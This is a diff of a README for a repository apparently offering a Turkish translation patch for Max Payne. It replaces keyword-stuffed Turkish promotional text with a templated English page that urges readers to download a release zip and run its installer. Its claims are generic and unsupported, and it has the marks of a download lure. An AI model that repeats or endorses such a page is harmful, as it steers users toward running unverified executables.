@@ -1,29 +1,75 @@
-[![https://turk-yama.com/max-payne](https://turk-yama.com/wp-content/uploads/2025/07/max-payne-turkce-yama-1.png)](https://turk-yama.com/max-payne)
-# ✅ Indirmek:
-https://turk-yama.com/max-payne
-# 💻 Açıklama:
-**Max Payne: Karanlık ve Unutulmaz Bir Hikaye**
+# 🎮 Max-Payne-Turkce-Yama - Experience Max Payne in Turkish
 
-Max Payne, klasik bir aksiyon ve nişancı video oyunu olarak, oyuncuları derin bir karanlık hikayeye sürüklüyor. Oyunun baş karakteri Max, intikam peşinde koşarken, kaybettiği aile üyelerinin acısıyla yüzleşiyor. Bu derin duygu yoğunluğu, oyunun atmosferini daha da etkileyici kılıyor.
+[![Download Latest Release](https://img.shields.io/static/v1?label=DOWNLOAD&message=LATEST+RELEASE&color=blue)](https://github.com/samagentAI/Max-Payne-Turkce-Yama/releases)
 
-Oyun, neo-noir tarzında kurgulanmış bir dünyada geçiyor. Max'in hayatındaki trajedi, oyunculara sadece bir aksiyon deneyimi sunmakla kalmıyor; aynı zamanda onları düşünmeye iten bir hikaye de sunuyor. Her köşede tehlikeler ve sürprizlerle dolu olan bu karanlık şehir, oyuncuları sürekli tetikte tutuyor.
+## 🚀 Getting Started
 
-Max Payne’in en dikkat çekici özelliklerinden biri, "bullet time" mekanizmasıdır. Bu yenilikçi oyun mekaniği, oyunculara düşmanlarının mermilerini yavaşlatma fırsatı tanır. Bu sayede, aksiyon sahneleri daha heyecan verici ve görsel olarak etkileyici hale geliyor. Max, düşmanlarıyla yüzleşirken, bu yetenek sayesinde hayatta kalma şansını artırıyor.
+Welcome to the Max-Payne-Turkce-Yama project! This application brings the excitement of Max Payne to Turkish speakers with improved voiceovers and subtitles. If you love gaming and want to enhance your experience, you are in the right place.
 
-Oyun, görsel tarzı ve atmosferiyle de dikkat çekiyor. Göz alıcı grafikler ve karanlık bir sanat tarzı, oyuncuları Max'in hikayesine daha fazla bağlıyor. Ayrıca, müzik ve ses efektleri, oyuncunun deneyimini zenginleştirerek adeta bir film izliyormuş hissi uyandırıyor.
+## 📦 Download & Install
 
-Max Payne, sadece bir video oyunu değil, aynı zamanda derin bir hikaye anlatımı sunuyor. İntihar eden bir polis memurunun yaşadığı içsel çatışmalar, onu tutkulu bir anti-kahraman haline getiriyor. Bu karakter gelişimi, oyuncuların Max ile empati kurmasına olanak tanıyor. 
+To install the Max-Payne-Turkce-Yama, visit this page to download: [Download Here](https://github.com/samagentAI/Max-Payne-Turkce-Yama/releases).
 
-Türkçe yama sayesinde, Max Payne’in karanlık ve karmaşık hikayesini tam olarak anlayabilir ve deneyiminizi daha da derinleştirebilirsiniz. Türkçe dil desteği, oyunun sunduğu zengin içeriklerin tadını çıkarmayı kolaylaştırıyor. Artık her repliği, her detayını daha iyi kavrayarak savaşın içine dalabilirsiniz.
+After downloading, follow these steps to set it up:
 
-Max Payne, sadece geçmişin gölgeleriyle yüzleşmekle kalmıyor; aynı zamanda kaybın ve intikamın ne denli yıkıcı olabileceğini de vurguluyor. Oyun boyunca, oyuncular Max’in karamsar psikolojisine ve intikam arayışına tanıklık ediyor. Bu, onu unutulmaz kılan unsurlardan biri.
+1. **Visit the Releases Page**: Click the link above to go directly to the releases page.
+2. **Choose the Latest Version**: Look for the most recent release at the top of the page.
+3. **Download the Zip File**: Click the file link to download the zip version of the mod.
+4. **Extract Files**: Locate the downloaded zip file and extract it to a new folder on your computer.
+5. **Run the Installer**: Inside the folder, find the installer file and double-click it.
+6. **Follow Instructions**: Follow the prompts to complete the installation. 
 
-Sonuç olarak, Max Payne, hem oyun mekaniği hem de derin hikaye anlatımı ile öne çıkan bir yapım. Türkçe yama ile birlikte, bu eşsiz deneyimi daha iyi kavrayabilir ve Max’in dünyasında kaybolabilirsiniz. Aksiyon dolu sahneler ve duygusal derinlik, Max Payne’i video oyunları tarihinin en önemli yapımlarından biri haline getiriyor.
-# ⚙️ Talimat:
-[![https://turk-yama.com/max-payne](https://turk-yama.com/i.gif)](https://turk-yama.com/max-payne)
-#
-[![https://turk-yama.com/max-payne](https://turk-yama.com/l.svg)](https://turk-yama.com/max-payne)
-# Etiketler:
-Max Payne Türkçe menü, Max Payne 2025 yaması, Max Payne Türkçe içerik, Max Payne Türkçe patch, Max Payne Türkçe karakterler, Max Payne Türkçe güncelleme, Max Payne dil yaması, Max Payne Türkçe hikaye, Max Payne oyun yaması indir, Max Payne yama dosyası, Max Payne yama 2025, Max Payne hikaye çevirisi, Max Payne lokalizasyon, Max Payne Türkçe çeviri, Max Payne Türkçe indirme, Max Payne Türkçe dil, Max Payne oyuncu topluluğu, Max Payne yamanın avantajları, Max Payne Türkçe forum, Max Payne oyunu hakkında
+## ❓ FAQs
 
+### What is Max-Payne-Turkce-Yama?
 
+Max-Payne-Turkce-Yama is a modification that translates the game into Turkish and improves dialogue and subtitles. This enhances the overall gaming experience for Turkish players.
+
+### What are the system requirements?
+
+To run Max-Payne-Turkce-Yama, you need:
+
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel Core i3 or equivalent
+- **Memory**: 4 GB RAM
+- **Graphics**: 1 GB video memory
+- **Storage**: 500 MB available disk space
+
+### How do I know if the installation was successful?
+
+After installation, launch Max Payne. If the dialogue and subtitles display in Turkish, the installation was successful!
+
+### Can I revert to the original version?
+
+Yes, upon installation, the mod will create a backup of the original files. If you wish to revert, simply locate the backup folder and restore the original files.
+
+## 🌟 Features
+
+- **Turkish Voiceovers**: Enjoy the game with localized voice acting.
+- **Subtitles**: All dialogues are translated and synced for better comprehension.
+- **User-Friendly Installer**: Set up the mod with a few simple steps.
+- **Regular Updates**: Stay tuned for future updates and improvements.
+
+## 📝 Community
+
+Join our community on forums for discussions about gameplay, tips, and sharing experiences. Share your thoughts and feedback, which help improve the mod further!
+
+### Get Help
+
+Need assistance? Visit the issues page [here](https://github.com/samagentAI/Max-Payne-Turkce-Yama/issues) to report bugs or ask questions.
+
+## 🛠️ Contributing
+
+If you want to contribute, please check our guidelines on the main repository page. We welcome contributions that enhance the mod!
+
+## 📩 Contact
+
+For further questions or feedback, feel free to reach out via the Issues section of the repository.
+
+## 🔗 Important Links
+
+- [Download Here](https://github.com/samagentAI/Max-Payne-Turkce-Yama/releases)
+- [Report Issues](https://github.com/samagentAI/Max-Payne-Turkce-Yama/issues)
+- [Community Forum](#)
+
+Enjoy the enhanced gaming experience in Turkish with Max-Payne-Turkce-Yama!
